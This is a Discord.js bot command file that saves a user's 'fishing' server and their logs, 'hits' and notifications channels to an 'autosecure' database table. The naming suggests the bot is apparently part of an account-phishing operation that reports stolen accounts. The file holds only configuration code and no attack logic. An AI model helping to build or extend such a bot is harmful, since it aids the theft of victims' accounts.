const { ApplicationCommandOptionType } = require("discord.js");
const { queryParams } = require("../../../db/db");

module.exports = {
    name: "set",
    description: `Set your server and channels!`,

    options: [
        {
            name: "channel",
            description: "What do you want to set?",
            type: ApplicationCommandOptionType.String,
            required: true,
            choices: [
                {
                    name: "Server",
                    value: "server",
                },
                {
                    name: "Logs",
                    value: "logs",
                },
                {
                    name: "Hits",
                    value: "hits",
                },
                {
                    name: "Notifications",
                    value: "notifications",
                },
            ],
        },
    ],
    adminOnly: true,
    callback: async (client, interaction) => {
        let choice = interaction.options.getString("channel")
        switch (choice) {
            case "server":
                await queryParams(`UPDATE autosecure SET server_id=? WHERE user_id=?`, [`${interaction.guildId}`, interaction.user.id])
                interaction.reply({ content: `Changed your fishing server`, ephemeral: true })
                break;
            case "logs":

                await queryParams(`UPDATE autosecure SET logs_channel=? WHERE user_id=?`, [`${interaction.channelId}|${interaction.guildId}`, interaction.user.id])
                interaction.reply({ content: `Changed your logs channel to <#${interaction.channelId}>`, ephemeral: true })
                interaction.channel.send({
                    content: `Will send logs in this channel!`
                })
                break
            case "hits":
                await queryParams(`UPDATE autosecure SET hits_channel=? WHERE user_id=?`, [`${interaction.channelId}|${interaction.guildId}`, interaction.user.id])
                interaction.reply({ content: `Changed your hits channel to <#${interaction.channelId}>`, ephemeral: true })
                interaction.channel.send({
                    content: `Will send hits in this channel!`
                })
                break
            case "notifications":
                await queryParams(`UPDATE autosecure SET notification_channel=? WHERE user_id=?`, [`${interaction.channelId}|${interaction.guildId}`, interaction.user.id])
                interaction.reply({ content: `Changed your notification channel to <#${interaction.channelId}>`, ephemeral: true })
                interaction.channel.send({
                    content: `Will send notifications to this channel!`
                })
                break
        }
    }
}